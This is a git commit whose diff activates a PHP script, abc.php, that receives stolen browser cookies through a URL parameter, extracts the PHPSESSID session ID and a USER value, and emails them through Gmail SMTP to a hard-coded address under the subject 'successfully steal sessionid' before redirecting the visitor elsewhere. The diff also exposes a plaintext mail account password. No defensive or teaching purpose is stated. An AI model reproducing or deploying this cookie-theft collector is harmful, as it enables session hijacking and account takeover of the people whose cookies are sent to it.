efb984da87effcc1bf01b31d54cdbfb989e3e4ce
dinhgihuong <65668603+huongd17at089@users.noreply.github.com>
2020-11-22 15:17:37 +0700

    Update abc.php

--- abc.php
+++ abc.php
@@ -1,45 +1,46 @@
 <?php
-// include 'PHPMailer/class.smtp.php';
-// include 'PHPMailer/class.phpmailer.php'; 
+include 'PHPMailer/class.smtp.php';
+include 'PHPMailer/class.phpmailer.php'; 
 
 if (isset($_GET["abc"])) {
     $cookie = $_GET["abc"];
-    $f = open("log.txt", "a" );
-//     fwrite( $f, date("Y-m-d h:i:sa").":\n".$cookie."\n\n");
+    $sessionid = "";
+    $user = "";
+    $arr = explode(";", $cookie);
+    $arrlength = count($arr);
+    for ($x = 0; $x < $arrlength; $x++){
+        if (strpos($arr[$x], "PHPSESSID"))
+            $sessionid = explode("=", $arr[$x])[1];
+        if (strpos($arr[$x], "USER"))
+            $user = explode("=", $arr[$x])[1];
+    }
+    
+    
+    $mail = new PHPMailer();
+    $mail->IsSMTP();
+    $mail->CharSet = "utf-8";
+    $mail->SMTPDebug = 0;
+    $mail->SMTPAuth = true;
+    $mail->SMTPSecure = "ssl";
+    $mail->Host = "smtp.gmail.com";
+    $mail->Port = 465;
+
+    $mail->Username = 'ahbcgd590@gmail.com';
+    $mail->Password = '102102102';
+    $mail->SetFrom('ahbcgd590@gmail.com', "steal SESIONID");
+    $mail->AddReplyTo('ahbcgd590@gmail.com', 'Admin');
+    $mail->Subject = 'successfully steal sessionid';
+    $mail->MsgHTML("sessionid : ".$sessionid." user : ".$user);
+    $mail->AddAddress('ahbcgd590@gmail.com', 'me');
+    
+    $mail->Send();
+
     header('Location: http://matxac.com/');
     
-//     $sessionid = "";
-//     $user = "";
-//     $arr = explode(";", $cookie);
-//     $arrlength = count($arr);
-//     for ($x = 0; $x < $arrlength; $x++){
-//         if (strpos($arr[$x], "PHPSESSID"))
-//             $sessionid = explode("=", $arr[$x])[1];
-//         if (strpos($arr[$x], "USER"))
-//             $user = explode("=", $arr[$x])[1];
-//     }
-        
 
 
-//     $mail = new PHPMailer();
-//     $mail->IsSMTP();
-//     $mail->CharSet = "utf-8";
-//     $mail->SMTPDebug = 0;
-//     $mail->SMTPAuth = true;
-//     $mail->SMTPSecure = "ssl";
-//     $mail->Host = "smtp.gmail.com";
-//     $mail->Port = 465;
-
-//     $mail->Username = 'ahbcgd590@gmail.com';
-//     $mail->Password = '102102102';
-//     $mail->SetFrom('ahbcgd590@gmail.com', "steal SESIONID");
-//     $mail->AddReplyTo('ahbcgd590@gmail.com', 'Admin');
-//     $mail->Subject = 'successfully steal sessionid';
-//     $mail->MsgHTML("sessionid : ".$sessionid." user : ".$user);
-//    //  $mail->MsgHTML("ok");
-//     $mail->AddAddress('ahbcgd590@gmail.com', 'me');
-    
-//     $mail->Send();
+//     $f = open("log.txt", "a" );
+//     fwrite( $f, date("Y-m-d h:i:sa").":\n".$cookie."\n\n");
     
 //     echo '<img src="67586673.jpg" alt="hello!"  style="width: 100%; height: auto;">';
 
